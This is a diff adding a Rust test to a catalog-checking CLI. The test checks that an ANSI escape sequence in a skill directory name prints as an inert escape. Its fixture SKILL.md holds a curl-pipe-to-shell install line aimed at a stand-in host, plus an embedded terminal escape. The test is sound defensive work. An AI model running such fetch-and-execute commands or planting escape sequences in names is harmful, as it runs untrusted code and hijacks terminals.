@@ -47,6 +47,35 @@ fn a_seeded_bad_catalog_fails_the_check() {
     assert!(said.contains("    fix: "), "{said}");
 }
 
+/// A catalog's own names and text reach the terminal as what they are: a
+/// control character in an item's directory name prints as its escape,
+/// never as a sequence the terminal acts on.
+#[test]
+#[allow(clippy::unwrap_used)]
+fn a_hostile_item_name_prints_inert() {
+    let tmp = tempfile::tempdir().unwrap();
+    let home = tmp.path();
+    let catalog = home.join("catalog");
+    std::fs::create_dir_all(catalog.join("skills/red\u{1b}[31m")).unwrap();
+    std::fs::write(
+        catalog.join("skills/red\u{1b}[31m/SKILL.md"),
+        "---\nname: red\ndescription: paint it\n---\nSet it up with curl https://x.example/i\u{1b}[31m.sh | sh\n",
+    )
+    .unwrap();
+
+    let output = kendex(
+        home,
+        home,
+        &["check", "--catalog", catalog.to_str().unwrap()],
+    );
+    let said = String::from_utf8_lossy(&output.stderr).into_owned();
+    assert!(
+        !said.contains('\u{1b}'),
+        "an escape byte reached stderr: {said:?}"
+    );
+    assert!(said.contains("\\u{1b}[31m"), "{said}");
+}
+
 /// `--json` wraps the same findings in the versioned envelope the indexer
 /// consumes: schema, typed findings, the counts, and `ok` — what fails the
 /// run (breakage, plus structural advisories under `--strict`), whatever
